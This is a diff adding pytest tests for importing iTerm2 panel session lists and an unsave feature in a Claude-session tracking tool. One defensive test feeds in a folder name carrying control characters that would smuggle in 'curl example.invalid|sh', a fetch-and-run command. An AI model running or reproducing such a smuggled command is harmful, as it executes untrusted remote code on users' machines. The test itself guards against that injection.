@@ -731,3 +731,143 @@ def test_a_repeated_prompt_with_nothing_new_does_not_rewrite_the_row(env):
     _bind(SID_A, "api")
     _seen(env, SID_A, cwd="/work/repo")
     assert rs.get_session(env["conn"], SID_A)["project_name"] == "api"
+
+
+# --- phase 2: importing the iTerm2 panels' lists, and unsave -------------------------------
+# Spec: the approved phase 2 plan (same file, "שלב 2", decision 5 and "מה נבנה",
+# approved by Tomer 2026-10-25). The items below are invented examples in the
+# shape the earlier panels wrote: {id, name, cwd, command} plus optional
+# project, pinned, auto_name, saved_at (saved.json) or closed (recent.json).
+
+EPOCH = 1761300000.0  # a fixed moment, rendered in local time by the import
+
+
+def _local(epoch):
+    return datetime.fromtimestamp(epoch).strftime("%Y-%m-%d %H:%M:%S")
+
+
+def test_import_turns_a_saved_tab_into_a_saved_row(env):
+    _transcript(env["home"], SID_A)
+    item = {"id": "x1", "name": "retry work", "auto_name": "api", "project": "api", "pinned": True,
+            "cwd": "/work/api", "command": f"claude --resume {SID_A}", "saved_at": EPOCH}
+    result = rs.import_items(env["conn"], [item], [])
+    assert result == {"imported": 1, "merged": 0, "skipped": []}
+    row = rs.get_session(env["conn"], SID_A)
+    assert (row["saved"], row["pinned"], row["project_name"], row["mc_title"]) == (True, True, "api", "api")
+    assert row["custom_name"] == "retry work" and row["name"] == "retry work"
+    assert row["saved_at"] == _local(EPOCH) and row["closed_at"] is not None
+    assert row["command"] == f"cd /work/api && claude --resume {SID_A}"
+
+
+def test_import_puts_a_recently_closed_tab_in_closed(env):
+    _transcript(env["home"], SID_B)
+    item = {"id": "x2", "name": "scratch", "cwd": "/work/tmp", "command": f"claude --resume {SID_B}",
+            "closed": EPOCH}
+    rs.import_items(env["conn"], [], [item])
+    [row] = rs.list_sessions(env["conn"], "closed")
+    assert row["session_id"] == SID_B and row["closed_at"] == _local(EPOCH)
+    assert row["custom_name"] is None and row["name"] == "scratch"
+
+
+def test_import_keeps_what_the_hooks_wrote_and_takes_only_saved_name_and_pin(env):
+    _seen(env, SID_A, cwd="/work/from-hook")
+    rs.close_session(env["conn"], SID_A, "other")
+    item = {"id": "x1", "name": "my name", "auto_name": "auto", "pinned": True, "cwd": "/elsewhere",
+            "command": f"claude --resume {SID_A}", "saved_at": EPOCH}
+    result = rs.import_items(env["conn"], [item], [])
+    assert (result["imported"], result["merged"]) == (0, 1)
+    row = rs.get_session(env["conn"], SID_A)
+    assert (row["cwd"], row["auto_name"], row["mc_title"]) == ("/work/from-hook", "from-hook", None)
+    assert (row["saved"], row["pinned"], row["custom_name"]) == (True, True, "my name")
+
+
+def test_import_skips_a_tab_with_no_resume_command_and_reports_it(env):
+    item = {"id": "x3", "name": "logs", "cwd": "/var/log", "command": ""}
+    result = rs.import_items(env["conn"], [item], [])
+    assert result["imported"] == 0 and [s["name"] for s in result["skipped"]] == ["logs"]
+    assert rs.list_sessions(env["conn"]) == []
+
+
+def test_import_keeps_one_saved_row_per_project_and_title_newest_wins(env):
+    old = {"id": "o", "name": "renamed", "auto_name": "api", "project": "api", "cwd": "/w",
+           "command": f"claude --resume {SID_A}", "saved_at": EPOCH}
+    new = {"id": "n", "name": "api", "project": "api", "cwd": "/w",
+           "command": f"claude --resume {SID_B}", "saved_at": EPOCH + 3600}
+    rs.import_items(env["conn"], [new, old], [])  # the newer one listed first: saved_at decides
+    assert _ids(rs.list_sessions(env["conn"], "saved")) == [SID_B]
+    assert rs.get_session(env["conn"], SID_B)["name"] == "renamed"  # the hand-given name moves
+    assert _ids(rs.list_sessions(env["conn"], "closed")) == [SID_A]
+
+
+def test_import_leaves_saved_rows_it_did_not_touch(env):
+    # Two kept sessions of one project and title is a normal state: Keep
+    # does not replace. An import that adds nothing to that group leaves both.
+    for sid in (SID_A, SID_B):
+        _bind(sid, "api")
+        _seen(env, sid)
+        rs.close_session(env["conn"], sid, "other")
+    rs.keep(env["conn"], SID_A)  # closing SID_B replaced it, Keep brings it back
+    rs.rename(env["conn"], SID_A, "first")
+    rs.rename(env["conn"], SID_B, "second")
+    before = {r["session_id"]: (r["saved"], r["custom_name"]) for r in rs.list_sessions(env["conn"])}
+    rs.import_items(env["conn"], [], [])
+    after = {r["session_id"]: (r["saved"], r["custom_name"]) for r in rs.list_sessions(env["conn"])}
+    assert after == before == {SID_A: (True, "first"), SID_B: (True, "second")}
+
+
+def test_no_command_for_a_folder_with_a_control_character(env):
+    # The panels type the command into a terminal. A Ctrl+U and a carriage
+    # return in a folder name would erase the cd and run the rest.
+    _seen(env, SID_A, cwd="/work/a\x15curl example.invalid|sh\r")
+    rs.close_session(env["conn"], SID_A, "other")
+    assert rs.get_session(env["conn"], SID_A)["command"] is None
+
+
+def test_import_twice_changes_nothing_the_second_time(env):
+    item = {"id": "x2", "name": "scratch", "cwd": "/w", "command": f"claude --resume {SID_B}", "closed": EPOCH}
+    rs.import_items(env["conn"], [], [item])
+    before = rs.list_sessions(env["conn"])
+    assert rs.import_items(env["conn"], [], [item])["imported"] == 0
+    assert rs.list_sessions(env["conn"]) == before
+
+
+def test_unsave_moves_a_saved_row_to_closed_and_drops_its_pin(env):
+    _bind(SID_A, "api")
+    _seen(env, SID_A)
+    rs.close_session(env["conn"], SID_A, "other")
+    rs.set_pinned(env["conn"], SID_A, True)
+    assert rs.unsave(env["conn"], SID_A)
+    row = rs.get_session(env["conn"], SID_A)
+    assert (row["saved"], row["pinned"]) == (False, False)
+    assert _ids(rs.list_sessions(env["conn"], "closed")) == [SID_A]
+
+
+def test_cli_import_with_a_broken_file_imports_nothing(env, monkeypatch, capsys, tmp_path):
+    folder = tmp_path / "panels"
+    folder.mkdir()
+    (folder / "saved.json").write_text(json.dumps(
+        [{"id": "x", "name": "a", "cwd": "/w", "command": f"claude --resume {SID_A}"}]))
+    (folder / "recent.json").write_text("{not json")
+    with pytest.raises(SystemExit) as exit_:
+        _cli(monkeypatch, "import-iterm", str(folder))
+    assert exit_.value.code == 1
+    assert "cannot read" in capsys.readouterr().out
+    assert rs.get_session(env["conn"], SID_A) is None
+
+
+def test_cli_import_from_a_folder_with_neither_file_fails(env, monkeypatch, capsys, tmp_path):
+    with pytest.raises(SystemExit) as exit_:
+        _cli(monkeypatch, "import-iterm", str(tmp_path / "typo"))
+    assert exit_.value.code == 1
+    assert "no saved.json or recent.json" in capsys.readouterr().out
+
+
+def test_cli_import_reports_counts_and_skips(env, monkeypatch, capsys, tmp_path):
+    folder = tmp_path / "panels"
+    folder.mkdir()
+    (folder / "saved.json").write_text(json.dumps([
+        {"id": "x", "name": "a", "cwd": "/w", "command": f"claude --resume {SID_A}"},
+        {"id": "y", "name": "logs", "cwd": "/var/log", "command": ""}]))
+    _cli(monkeypatch, "import-iterm", str(folder))
+    out = capsys.readouterr().out
+    assert "Imported 1" in out and "Skipped (no claude --resume command): logs" in out
